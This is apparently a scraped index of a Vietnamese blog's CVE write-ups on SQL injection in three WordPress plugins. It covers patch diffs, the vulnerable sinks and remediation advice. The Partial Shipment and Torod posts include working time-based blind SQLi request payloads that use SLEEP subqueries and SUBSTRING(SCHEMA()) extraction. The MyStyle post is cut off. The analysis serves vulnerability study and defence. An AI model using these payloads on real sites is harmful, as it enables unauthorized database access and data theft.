c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php Nh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói. Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. K·∫øt qu·∫£ t√¨m v·ªã tr√≠ sink trong m√£ ngu·ªìn get_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra. So s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° B·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u003eprepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rget_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng. function wxp_order_set_shipped(){ $order_id = isset($_POST['order_id']) ? $_POST['order_id'] : 0; // other logic $wxp_shipment = $this-\u003eget_wxp_shipment_data($order_id); if(isset($_POST['order_id']) \u0026\u0026 $_POST['order_id']){ global $wpdb; $shipment_id = $this-\u003eget_shipment_id($_POST['order_id']); if(!$shipment_id){ $data = array( 'order_id' =\u003e$order_id, 'shipment_id' =\u003e1, 'shipment_url'=\u003e'', 'shipment_num'=\u003e'', 'shipment_date'=\u003ecurrent_time('timestamp',0), ); $wpdb-\u003einsert($wpdb-\u003eprefix.\"partial_shipment\",$data,array('%d','%d','%s','%s','%s')); $shipment_id = $wpdb-\u003einsert_id; } // other logic } echo json_encode(array('order_id'=\u003e$order_id,'status'=\u003e$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin. T√¨m v·ªã tr√≠ n∆°i h√†m wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi wxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u003e y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p üëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë: action=wxp_order_set_shipped\u0026order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rG·ª≠i POST request ch·ª©a payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh: SELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i K·∫øt qu·∫£ ph·∫£n h·ªìi khi khai th√°c th√†nh c√¥ng Ta s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, SLEEP ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác SLEEP b·ªã nh√¢n nhi·ªÅu l·∫ßn. V√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT SLEEP(5)) Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n Th·ªùi gian ph·∫£n h·ªìi tƒÉng theo c·∫•p s·ªë nh√¢n ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. G·ª≠i request v·ªõi SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(‚Äòw‚Äô) S·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field. üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment tr∆∞·ªõc phi√™n b·∫£n 3.3, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. Ch∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y. Key takeaways: Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u003eprepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Woocommerce Partial Shipment Plugin \u003c= 3.2 is vulnerable to SQL Injection ","date":"2025-09-29","objectID":"/vi/posts/2025-09-29-cve-2025-48118/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/vi/posts/2025-09-29-cve-2025-48118/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Sink\rCVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói. Trong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. T√¨m v·ªã tr√≠ sink trong code üëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#vulnerable-sink"},{"categories":["CVE Analysis"],"collections":null,"content":"How it work?\rL·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin. T√¨m v·ªã tr√≠ h√†m get_regions_and_cities üëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action wp_ajax_get_regions_and_cities ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities ƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities. Nh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#how-it-work"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rG·ª≠i POST request ch·ª©a payload SQLi. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) K·∫øt qu·∫£ ph·∫£n h·ªìi th·ªùi gian üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e payload ho·∫°t ƒë·ªông. C√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng: UNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Th·ª© t·ª± th·ª±c thi truy v·∫•n SQL ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c. G·ª≠i request v·ªõi SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(‚Äòw‚Äô) S·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field. üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u003e k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection. Ch∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y. Key takeaways: Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u003eprepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress Torod Plugin \u003c= 1.9 is vulnerable to SQL Injection ","date":"2025-09-28","objectID":"/vi/posts/2025-09-28-cve-2025-30936/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/vi/posts/2025-09-28-cve-2025-30936/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analysis"],"collections":null,"content":"L·ªó h·ªïng t·ªìn t·∫°i trong plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng t∆∞∆°ng t√°c tr·ª±c ti·∫øp v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh·∫£ nƒÉng tr√≠ch xu·∫•t ho·∫∑c thao t√∫ng d·ªØ li·ªáu. CVE ID: CVE-2025-48281 S·∫£n ph·∫©m: WordPress MyStyle Custom Product Designer Plugin Lo·∫°i l·ªó h·ªïng: SQL Injection Phi√™n b·∫£n b·ªã ·∫£nh h∆∞·ªüng: \u003c= 3.21.1 M·ª©c ƒë·ªô nghi√™m tr·ªçng (CVSS): Cao (9.3) Y√™u c·∫ßu ƒë·∫∑c quy·ªÅn: Kh√¥ng c·∫ßn x√°c th·ª±c ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (c√≥ l·ªó h·ªïng) v√† v3.21.2 (ƒë√£ v√°) C√¥ng c·ª• diff: meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh phi√™n b·∫£n n√†o WooCommerce plugin: ph·∫£i ƒë∆∞·ª£c k√≠ch ho·∫°t tr∆∞·ªõc khi c√†i ƒë·∫∑t MyStyle v√¨ plugin n√†y s·ª≠ d·ª•ng m·ªôt s·ªë h√†m t·ª´ WooCommerce ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rNguy√™n nh√¢n ch√≠nh l√† vi·ªác ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ tham s·ªë GET v√†o c√¢u truy v·∫•n SQL m√† kh√¥ng c√≥ bi·ªán ph√°p x√°c th·ª±c h·ª£p l·ªá. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rD∆∞·ªõi ƒë√¢y l√† s·ª± kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n (3.21.1 v√† 3.21.2) trong file includes/entities/class-mystyle-designmanager.php. So s√°nh b·∫£n v√° B·∫£n v√° m·ªõi ƒë√£ th√™m danh s√°ch whitelist $allowed_orderby ƒë·ªÉ ch·ªâ cho ph√©p s·∫Øp x·∫øp theo c√°c c·ªôt h·ª£p l·ªá. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch, n√≥ s·∫Ω t·ª± ƒë·ªông b·ªã thay th·∫ø b·∫±ng 'ms_design_id', ngƒÉn ch·∫∑n ch√®n m√£ ƒë·ªôc SQL. ","date":"2025-09-27","objectID":"/vi/posts/2025-09-27-cve-2025-48281/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/vi/posts/2025-09-27-cve-2025-48281/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rL·ªó h·ªïng n·∫±m trong h√†m get_designs thu·ªôc class MyStyle_DesignManager (file includes/entities/class-mystyle-designmanager.php). H√†m n√†y ƒë∆∞·ª£c g·ªçi b·ªüi c√°c h√†m nh∆∞ get_items, init_index_request, v√† m·ªôt s·ªë h√†m ki·ªÉm th·ª≠. K·∫øt qu·∫£ t√¨m ki·∫øm get_designs V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, c·∫ßn x√°c ƒë·ªãnh h√†m n√†o c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi m√† kh√¥ng y√™u c·∫ßu ƒëƒÉng nh·∫≠p. K·∫øt qu·∫£ cho th·∫•y ch·ªâ c√≥ init_index_request c√≥ th·ªÉ b·ªã khai th√°c tr·ª±c ti·∫øp qua URL /designs/. Lu·ªìng t·∫•n c√¥ng 